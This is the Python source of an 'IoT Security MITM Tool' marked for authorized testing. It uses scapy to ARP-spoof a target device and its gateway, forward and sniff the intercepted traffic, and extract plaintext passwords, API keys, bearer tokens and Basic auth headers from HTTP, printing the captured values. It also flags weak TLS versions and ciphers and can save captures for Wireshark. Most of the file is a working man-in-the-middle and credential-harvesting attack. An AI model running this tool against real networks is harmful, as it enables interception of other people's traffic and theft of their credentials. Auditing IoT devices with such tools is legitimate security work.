#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# ---
# IoT Security MITM Tool by Akash Chathoth
# For educational and authorized testing purposes only.
#
# This tool is intended for security professionals and researchers to audit
# IoT devices on networks they are authorized to test. Unauthorized use
# against any network or system is illegal. The developers assume no
# liability and are not responsible for any misuse or damage.
#
# Version 2.3 - September 2025
# ---

import scapy.all as scapy
import argparse
import time
import threading
import os
import subprocess
import sys
import struct
import re
import shutil
from datetime import datetime

# --- Color Class for Beautified Console Output ---
class Colors:
    """A class to hold color codes for terminal output."""
    RESET = '\033[0m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# --- Helper Dictionaries for TLS Parsing ---
TLS_VERSIONS = {
    b'\x03\x00': 'SSL 3.0 (DEPRECATED - Critical)',
    b'\x03\x01': 'TLS 1.0 (DEPRECATED - High Risk)',
    b'\x03\x02': 'TLS 1.1 (DEPRECATED - Medium Risk)',
    b'\x03\x03': 'TLS 1.2',
    b'\x03\x04': 'TLS 1.3',
    b'\x7F\x1C': 'TLS 1.3 Draft 28', # Common in some older stacks
    b'\x7F\x1D': 'TLS 1.3 Draft 29'  # Common in some older stacks
}

# Complete list of weak and deprecated cipher suites
WEAK_CIPHERS = {
    # Add your extensive list of weak ciphers here...
    # (The list from the original script is excellent and comprehensive)
    # --- RC4 Stream Cipher (Deprecated across all TLS versions) ---
    b'\x00\x04': 'TLS_RSA_WITH_RC4_128_MD5',
    b'\x00\x05': 'TLS_RSA_WITH_RC4_128_SHA',
    b'\xc0\x07': 'TLS_ECDHE_ECDSA_WITH_RC4_128_SHA',
    b'\xc0\x11': 'TLS_ECDHE_RSA_WITH_RC4_128_SHA',
    # --- NULL Encryption Ciphers (No Confidentiality) ---
    b'\x00\x01': 'TLS_RSA_WITH_NULL_MD5',
    b'\x00\x02': 'TLS_RSA_WITH_NULL_SHA',
    b'\x00\x3B': 'TLS_RSA_WITH_NULL_SHA256',
    # --- DES and 3DES Ciphers (Weak Block Size) ---
    b'\x00\x09': 'TLS_RSA_WITH_DES_CBC_SHA',
    b'\x00\x0A': 'TLS_RSA_WITH_3DES_EDE_CBC_SHA',
    b'\xc0\x12': 'TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA',
    # --- RSA Key Exchange Ciphers (No Forward Secrecy) ---
    b'\x00\x2F': 'TLS_RSA_WITH_AES_128_CBC_SHA',
    b'\x00\x35': 'TLS_RSA_WITH_AES_256_CBC_SHA',
    b'\x00\x9C': 'TLS_RSA_WITH_AES_128_GCM_SHA256',
    # --- SHA-1 Hash-based Ciphers (Collision Vulnerable) ---
    b'\x00\x33': 'TLS_DHE_RSA_WITH_AES_128_CBC_SHA',
    b'\xc0\x13': 'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
    # --- CBC Mode Ciphers (Vulnerable to Timing/Padding Oracle Attacks) ---
    b'\xc0\x27': 'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256',
    # --- Anonymous Ciphers (No Authentication) ---
    b'\x00\x18': 'TLS_DH_anon_WITH_RC4_128_MD5',
    # --- Export Grade Ciphers (Intentionally Weakened) ---
    b'\x00\x03': 'TLS_RSA_EXPORT_WITH_RC4_40_MD5',
    b'\x00\x08': 'TLS_RSA_EXPORT_WITH_DES40_CBC_SHA',
}

# --- Core Functions ---

def get_arguments():
    """Parses and returns command-line arguments."""
    parser = argparse.ArgumentParser(
        description=f"{Colors.BOLD}IoT Security MITM Tool by Akash Chathoth.{Colors.RESET}",
        epilog=f"Example: {Colors.CYAN}sudo python3 %(prog)s -t 192.168.1.101 -g 192.168.1.1 -i wlan0 --fullscan -o report.md{Colors.RESET}"
    )
    parser.add_argument("-t", "--target", required=True, dest="target_ip",
                        help="IP address of the target IoT device.")
    parser.add_argument("-g", "--gateway", required=True, dest="gateway_ip",
                        help="IP address of the gateway/router.")
    parser.add_argument("-i", "--interface", dest="interface", default="wlan0",
                        help="Network interface to use (default: wlan0).")

    action_group = parser.add_mutually_exclusive_group()
    action_group.add_argument("--scan", action="store_true", help="Scan and analyze HTTP requests/responses.")
    action_group.add_argument("--sslscan", action="store_true", help="Analyze TLS handshakes for weak ciphers/versions.")
    action_group.add_argument("--wireshark", action="store_true", help="Capture traffic to .pcap file and open in Wireshark.")
    action_group.add_argument("--fullscan", action="store_true", help="Comprehensive scan (HTTP + TLS analysis).")

    parser.add_argument("--output", "-o", dest="output_file",
                        help="Save scan results to a structured Markdown file.")
    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose output for debugging.")

    args = parser.parse_args()
    if not any([args.scan, args.sslscan, args.wireshark, args.fullscan]):
        parser.error("No action specified. Please use --scan, --sslscan, --wireshark, or --fullscan.")
    return args

def print_banner():
    """Displays the tool banner with colors."""
    banner = f"""
{Colors.BLUE}╔══════════════════════════════════════════════════════════════════════════════╗
{Colors.BOLD}{Colors.CYAN}              IoT Security MITM Tool v2.3 by Akash Chathoth               {Colors.BLUE}
{Colors.CYAN}                         For Authorized Testing Only                        {Colors.BLUE}
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
    """
    print(banner)

def log(message, level="INFO", output_file=None):
    """Logs messages with timestamps, levels, colors, and optional file output."""
    level_colors = {
        "INFO": Colors.GREEN,
        "WARN": Colors.YELLOW,
        "ERROR": Colors.RED,
        "CRITICAL": Colors.BOLD + Colors.RED,
        "VULN": Colors.MAGENTA,
    }
    color = level_colors.get(level, Colors.CYAN)
    timestamp = datetime.now().strftime("%H:%M:%S")
    
    console_message = f"{color}[{level}]{Colors.RESET} [{timestamp}] {message}"
    print(console_message)

    if output_file:
        try:
            # Format for Markdown file
            if level in ["VULN", "WARN", "CRITICAL"]:
                file_message = f"**[{level}]** {message}\n"
            else:
                file_message = f"`[{level}]` {message}\n"
            
            with open(output_file, "a", encoding="utf-8") as f:
                f.write(file_message)
        except IOError as e:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} Could not write to output file: {e}")

def check_dependencies():
    """Checks if required system commands are installed."""
    log("Checking for required dependencies (nmap, tshark, arping)...", "INFO")
    dependencies = ["nmap", "tshark", "arping"]
    missing = [dep for dep in dependencies if not shutil.which(dep)]
    if missing:
        log(f"Missing dependencies: {', '.join(missing)}.", "ERROR")
        log("Please install them to ensure full functionality (e.g., 'sudo apt install nmap tshark iputils-arping').", "INFO")
        sys.exit(1)
    log("All dependencies are installed.", "INFO")

def enhanced_get_mac(ip, interface):
    """
    Enhanced MAC resolution using multiple strategies for better reliability.
    Uses regex for safer parsing.
    """
    mac_regex = r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})"
    
    # Strategy 1: Use system arping (reliable for local network)
    log(f"Resolving MAC for {ip} using arping...", "INFO")
    try:
        result = subprocess.run(
            ['arping', '-c', '2', '-I', interface, ip],
            capture_output=True, text=True, timeout=5, check=True
        )
        match = re.search(mac_regex, result.stdout)
        if match:
            mac = match.group(1)
            log(f"Resolved {ip} -> {mac}", "INFO")
            return mac
    except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
        log(f"arping failed for {ip}. Trying next method.", "WARN")

    # Strategy 2: Scapy ARP (good fallback)
    log(f"Resolving MAC for {ip} using Scapy ARP...", "INFO")
    try:
        ans, _ = scapy.srp(
            scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip),
            timeout=3, iface=interface, verbose=False, retry=2
        )
        if ans:
            mac = ans[0][1].hwsrc
            log(f"Resolved {ip} -> {mac}", "INFO")
            return mac
    except Exception as e:
        log(f"Scapy ARP request failed for {ip}: {e}", "WARN")

    log(f"Could not resolve MAC address for {ip}", "ERROR")
    return None

def ip_forwarding(enable: bool):
    """Enables or disables IP forwarding in a platform-independent way."""
    path = "/proc/sys/net/ipv4/ip_forward"
    if not os.path.exists(path):
        log("IP forwarding path not found. Not a Linux system?", "ERROR")
        return
        
    val = "1" if enable else "0"
    try:
        with open(path, "w") as f:
            f.write(val)
        status = f"{Colors.GREEN}Enabled{Colors.RESET}" if enable else f"{Colors.YELLOW}Disabled{Colors.RESET}"
        log(f"IP Forwarding {status}", "INFO")
    except PermissionError:
        log("Permission denied. Please run the script with sudo.", "ERROR")
        sys.exit(1)
    except Exception as e:
        log(f"Error modifying IP forwarding: {e}", "ERROR")

def spoof(target_ip, spoof_ip, target_mac, interface):
    """Sends a single ARP spoofing packet at Layer 2 to avoid warnings."""
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, iface=interface, verbose=False)

def restore(dest_ip, src_ip, dest_mac, src_mac, interface):
    """Restores the ARP tables of the target and gateway at Layer 2."""
    log(f"Restoring ARP table for {dest_ip}...", "INFO")
    packet = scapy.Ether(dst=dest_mac) / scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.sendp(packet, count=4, iface=interface, verbose=False)

def analyze_cipher_weakness(cipher_name):
    """Analyzes cipher weakness and returns severity level and reasons."""
    reasons = []
    if 'RC4' in cipher_name: return "CRITICAL", ["RC4 stream cipher is fundamentally broken (CVE-2013-2566)."]
    if 'NULL' in cipher_name: return "CRITICAL", ["Transmits data in plaintext with no encryption."]
    if 'EXPORT' in cipher_name: return "CRITICAL", ["Export-grade cipher, intentionally weakened and easily breakable."]
    if 'anon' in cipher_name: return "CRITICAL", ["No authentication, vulnerable to active MITM attacks."]
    if 'DES_CBC' in cipher_name and '3DES' not in cipher_name: return "HIGH", ["56-bit DES key is vulnerable to brute force."]
    if 'MD5' in cipher_name: return "HIGH", ["MD5 hash algorithm is vulnerable to collisions."]
    if cipher_name.startswith('TLS_RSA_WITH'): reasons.append("Uses RSA key exchange, which lacks forward secrecy.")
    if '3DES' in cipher_name: reasons.append("Uses 64-bit blocks, vulnerable to Sweet32 attack (CVE-2016-2183).")
    if '_CBC_SHA' in cipher_name and '_SHA256' not in cipher_name: reasons.append("CBC mode with SHA-1 is vulnerable to BEAST/Lucky13 attacks.")
    
    if len(reasons) > 1: return "MEDIUM", reasons
    if len(reasons) == 1: return "LOW", reasons
    return "LOW", ["Considered weak or outdated."]

def parse_tls_handshake(packet, args):
    """Enhanced TLS Client Hello packet analysis with more robust parsing."""
    if not packet.haslayer(scapy.Raw): return
    
    payload = packet[scapy.Raw].load
    # Check for TLS Handshake (0x16) and Client Hello (0x01)
    if len(payload) < 6 or payload[0] != 0x16 or payload[5] != 0x01: return

    try:
        # Client Version (2 bytes) starts at offset 9
        if len(payload) < 11: return
        client_version = payload[9:11]
        version_str = TLS_VERSIONS.get(client_version, f"Unknown (0x{client_version.hex()})")
        
        log(f"TLS Client Hello: {packet[scapy.IP].src} -> {packet[scapy.IP].dst}", "INFO", args.output_file)
        log(f"  Protocol Version: {version_str}", "INFO", args.output_file)
        
        if client_version in [b'\x03\x00', b'\x03\x01', b'\x03\x02']:
            log(f"  DEPRECATED TLS VERSION DETECTED! This is a high-risk finding.", "VULN", args.output_file)

        # Calculate offset for cipher suites
        # After Random (32 bytes), there's a variable length session ID
        current_offset = 9 + 2 + 32 # version + random
        if len(payload) <= current_offset: return
        session_id_len = payload[current_offset]
        
        current_offset += 1 + session_id_len # session_id_len byte + session_id
        if len(payload) <= current_offset + 2: return
        ciphers_len = struct.unpack('!H', payload[current_offset:current_offset+2])[0]
        
        current_offset += 2
        ciphers_end = current_offset + ciphers_len
        if len(payload) < ciphers_end: return
        
        ciphers_blob = payload[current_offset:ciphers_end]
        
        weak_ciphers_found = []
        for i in range(0, len(ciphers_blob), 2):
            cipher = ciphers_blob[i:i+2]
            if cipher in WEAK_CIPHERS:
                cipher_name = WEAK_CIPHERS[cipher]
                severity, reasons = analyze_cipher_weakness(cipher_name)
                weak_ciphers_found.append({
                    'hex': cipher.hex().upper(), 'name': cipher_name,
                    'severity': severity, 'reasons': reasons
                })
        
        log(f"  Offered {len(ciphers_blob)//2} cipher suites.", "INFO", args.output_file)
        if weak_ciphers_found:
            log(f"  VULNERABLE CIPHERS OFFERED: {len(weak_ciphers_found)} found.", "VULN", args.output_file)
            # Sort by severity
            weak_ciphers_found.sort(key=lambda x: ("CRITICAL", "HIGH", "MEDIUM", "LOW").index(x['severity']))
            for cipher in weak_ciphers_found:
                log(f"    - [{cipher['severity']}] 0x{cipher['hex']}: {cipher['name']}", "VULN", args.output_file)
                for reason in cipher['reasons']:
                    log(f"      - {reason}", "VULN", args.output_file)
        else:
            log("  No deprecated or weak cipher suites detected in Client Hello.", "INFO", args.output_file)

    except (IndexError, struct.error) as e:
        if args.verbose:
            log(f"Error parsing TLS handshake: {e}", "WARN")

def analyze_http_traffic(packet, args):
    """Analyzes HTTP traffic for plaintext credentials and sensitive data."""
    if not packet.haslayer(scapy.Raw): return
    
    try:
        payload = packet[scapy.Raw].load.decode('utf-8', 'ignore')
    except UnicodeDecodeError:
        return
        
    # Regex for common credentials and keys
    sensitive_patterns = {
        'Password': r'(?i)passw(?:or)?d\s*[:=]\s*([^\s&"\'\\]+)',
        'API Key': r'(?i)api(?:_|-)?key\s*[:=]\s*([a-zA-Z0-9\-_]{16,})',
        'Auth Token': r'(?i)bearer|token\s*[:=]\s*([a-zA-Z0-9\-_=.]+)',
        'Authorization': r'(?i)Authorization:\s*(Basic\s+[a-zA-Z0-9=+/]+)',
    }
    
    is_request = packet[scapy.TCP].dport in [80, 8080]
    direction = f"{packet[scapy.IP].src} -> {packet[scapy.IP].dst}"
    
    if is_request and ("GET " in payload or "POST " in payload):
        first_line = payload.splitlines()[0]
        log(f"HTTP Request: {direction} | {first_line}", "INFO", args.output_file)
    elif not is_request and "HTTP/" in payload:
        first_line = payload.splitlines()[0]
        log(f"HTTP Response: {direction} | {first_line}", "INFO", args.output_file)
    else:
        return # Not an interesting HTTP packet

    for name, pattern in sensitive_patterns.items():
        match = re.search(pattern, payload)
        if match:
            log(f"PLAINTEXT SENSITIVE DATA DETECTED over HTTP!", "VULN", args.output_file)
            log(f"  Type: {name}", "VULN", args.output_file)
            log(f"  Data: {match.group(1)}", "VULN", args.output_file)
            log(f"  Transmitting sensitive data over unencrypted HTTP is a critical vulnerability.", "VULN", args.output_file)

def packet_processor(args):
    """Returns a configured callback function to process sniffed packets."""
    def process(packet):
        try:
            if args.scan or args.fullscan:
                if packet.haslayer(scapy.TCP) and (packet[scapy.TCP].dport in [80, 8080] or packet[scapy.TCP].sport in [80, 8080]):
                    analyze_http_traffic(packet, args)
            
            if args.sslscan or args.fullscan:
                if packet.haslayer(scapy.TCP) and (packet[scapy.TCP].dport == 443 or packet[scapy.TCP].sport == 443):
                    parse_tls_handshake(packet, args)
        except Exception as e:
            if args.verbose:
                log(f"Error processing packet: {e}", "ERROR")
    return process

def main():
    """Main function to run the tool."""
    args = get_arguments()
    
    if os.geteuid() != 0:
        print(f"{Colors.RED}[ERROR] This tool requires root privileges. Please run with sudo.{Colors.RESET}")
        sys.exit(1)
        
    print_banner()
    check_dependencies()
    
    if args.output_file:
        try:
            with open(args.output_file, "w") as f:
                f.write("# IoT Security MITM Tool Report\n\n")
                f.write(f"**Scan Started:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"**Target:** `{args.target_ip}`\n")
                f.write(f"**Gateway:** `{args.gateway_ip}`\n")
                f.write(f"**Interface:** `{args.interface}`\n\n")
                f.write("## Log\n\n")
        except IOError as e:
            log(f"Cannot write to output file {args.output_file}: {e}", "ERROR")
            args.output_file = None

    log(f"Target: {args.target_ip}, Gateway: {args.gateway_ip}, Interface: {args.interface}", "INFO")

    target_mac = enhanced_get_mac(args.target_ip, args.interface)
    gateway_mac = enhanced_get_mac(args.gateway_ip, args.interface)
    
    if not all([target_mac, gateway_mac]):
        log("Failed to resolve necessary MAC addresses. Exiting.", "CRITICAL")
        log("Troubleshooting: check IP addresses, network connectivity, and ensure devices are online.", "INFO")
        return

    log(f"Target MAC: {target_mac}", "INFO")
    log(f"Gateway MAC: {gateway_mac}", "INFO")

    stop_event = threading.Event()
    
    def arp_spoofing_thread():
        packets_sent = 0
        while not stop_event.is_set():
            spoof(args.target_ip, args.gateway_ip, target_mac, args.interface)
            spoof(args.gateway_ip, args.target_ip, gateway_mac, args.interface)
            packets_sent += 2
            print(f"\r{Colors.BLUE}[*]{Colors.RESET} ARP spoofing active... Packets sent: {packets_sent}", end="", flush=True)
            time.sleep(2)

    capture_process = None
    pcap_file = None
    try:
        ip_forwarding(True)
        spoof_thread = threading.Thread(target=arp_spoofing_thread, daemon=True)
        spoof_thread.start()

        log("ARP spoofing active. Starting packet capture...", "INFO")
        
        filter_str = f"ip host {args.target_ip}"
        
        if args.wireshark:
            # Save capture to /tmp/ to avoid permission issues in the current directory
            pcap_file = f"/tmp/iot_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
            log(f"Capturing packets to {pcap_file}. Press CTRL+C to stop.", "INFO")
            tshark_cmd = ["tshark", "-i", args.interface, "-w", pcap_file, "-f", filter_str]
            
            capture_process = subprocess.Popen(tshark_cmd)
            
            # This loop allows us to wait for KeyboardInterrupt without exiting the main try block
            while capture_process.poll() is None:
                time.sleep(0.5)

        else:
            log(f"Monitoring traffic with filter: '{filter_str}'. Press CTRL+C to stop.", "INFO")
            scapy.sniff(iface=args.interface, store=False, prn=packet_processor(args), filter=filter_str, stop_filter=lambda p: stop_event.is_set())

    except KeyboardInterrupt:
        log("\nStopping tool...", "INFO")
        if capture_process:
            log("Terminating packet capture process...", "INFO")
            capture_process.terminate()
            capture_process.wait() # Ensure tshark finishes writing the file

    except Exception as e:
        log(f"An unexpected error occurred: {e}", "ERROR")
    finally:
        print("\n")
        log("Cleaning up and restoring network...", "INFO")
        stop_event.set()
        if 'spoof_thread' in locals() and spoof_thread.is_alive():
            spoof_thread.join(timeout=3)
        
        ip_forwarding(False)
        restore(args.target_ip, args.gateway_ip, target_mac, gateway_mac, args.interface)
        restore(args.gateway_ip, args.target_ip, gateway_mac, target_mac, args.interface)
        
        # Open Wireshark with the captured file after cleanup
        if args.wireshark and pcap_file:
            log(f"Attempting to open {pcap_file} in Wireshark...", "INFO")
            # Check if file exists and is not empty (pcap header is 24 bytes)
            if os.path.exists(pcap_file) and os.path.getsize(pcap_file) > 24:
                if shutil.which("wireshark"):
                    try:
                        subprocess.Popen(["wireshark", pcap_file])
                    except Exception as e:
                        log(f"Failed to launch Wireshark: {e}", "ERROR")
                else:
                    log("Wireshark is not in your system's PATH. Please open the file manually.", "WARN")
            else:
                log(f"Capture file {pcap_file} was not created or is empty. Tshark may have failed.", "ERROR")

        if args.output_file:
            log(f"Report saved to: {args.output_file}", "INFO")
            
        log("MITM tool finished.", "INFO")

if __name__ == "__main__":
    main()
